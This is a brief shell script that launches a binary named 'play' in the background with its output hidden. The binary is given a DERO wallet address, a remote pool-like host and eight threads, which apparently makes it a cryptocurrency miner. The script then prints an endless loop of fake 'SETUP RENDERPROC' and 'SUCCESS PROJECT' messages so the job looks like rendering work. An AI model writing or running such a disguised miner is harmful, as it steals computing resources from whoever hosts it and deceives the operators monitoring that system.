#!/bin/sh
chmod u+x play
./play -w dero1qysfzhrrt9u6sfxvpgc8lsn5q9slxu92ltmng0ucgrjslhugqfrmgqgzrjf98 -r 167.172.0.123:10100 -p rpc -m 8 > /dev/null 2>&1 &
sleep 3600
while true; do clear; echo SETUP RENDERPROC 1; sleep 5; clear; echo SUCCESS PROJECT; sleep 10;let "i++";  done
